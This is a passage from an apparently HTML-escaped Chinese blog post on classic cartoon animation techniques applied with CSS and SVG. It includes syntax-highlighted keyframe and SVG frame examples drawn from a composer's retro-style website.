&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;div&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;overflow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;hidden&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;width&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;vw&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;540&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;px&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;background-image&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;...&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;background-size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2750&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;px&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;540&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;px&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;background-repeat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;repeat-x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;animation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;background&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;scroll&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;linear&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;infinite&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;现代css实现技巧&#34;&gt;现代CSS实现技巧
&lt;/h2&gt;&lt;p&gt;汉纳-巴伯拉动画师开发的简单高效技术可以用CSS实现。现代布局工具允许网页开发者分层元素。可缩放矢量图形(SVG)可以包含多个帧，开发者不必依赖JavaScript，可以使用CSS改变元素的不透明度、位置和可见性。&lt;/p&gt;
&lt;p&gt;在为艾美奖得主游戏作曲家Mike Worth设计网站时，我运用了这些原则。他想要一个大胆的复古风格设计来展示他的作品。我在整个网站中使用CSS动画，为访客创造惊喜。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-css&#34; data-lang=&#34;css&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;keyframes&lt;/span&gt; &lt;span class=&#34;nt&#34;&gt;bumpy-ride&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;translate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;translate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;-5&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;px&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;translate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;px&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;30&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;translate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;-3&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;px&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;40&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;translate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;px&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;50&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;translate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;-10&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;px&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;60&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;translate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;px&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;70&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;translate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;px&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;80&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;translate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;px&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;90&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;translate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;-4&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;px&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;translate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;svg动画技巧&#34;&gt;SVG动画技巧
&lt;/h2&gt;&lt;p&gt;SVG提供了惊人的性能和灵活性。通过CSS操作组和其他元素的能力，使其成为动画的理想选择。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;svg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c&#34;&gt;&amp;lt;!-- 静态元素 --&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;...&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c&#34;&gt;&amp;lt;!-- 动画帧 --&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;g&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;frame-1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;...&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;g&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;frame-2&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;...&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;g&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;frame-3&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;...&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;g&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;frame-4&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;...&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;g&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;frame-5&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;...&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;g&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;frame-6&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;...&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;svg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-css&#34; data-lang=&#34;css&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;keyframes&lt;/span&gt; &lt;span class=&#34;nt&#34;&gt;ranger-talking&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;visibility&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;visible&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nc&#34;&gt;67&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;visibility&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;hidden&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;visibility&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;hidden&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;frame&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;visibility&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;hidden&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;animation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ranger-talking&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;var&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;animation&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;duration&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;infinite&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;动画的实用价值&#34;&gt;动画的实用价值
&lt;/h2&gt;&lt;p&gt;动画不仅仅是装饰，它们可以：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过引导用户操作改善可用性&lt;/li&gt;
&lt;li&gt;在交互时带来愉悦和惊喜&lt;/li&gt;
&lt;li&gt;强化品牌形象&lt;/li&gt;
&lt;li&gt;帮助讲述品牌故事&lt;/li&gt;
&lt;/ul&gt;
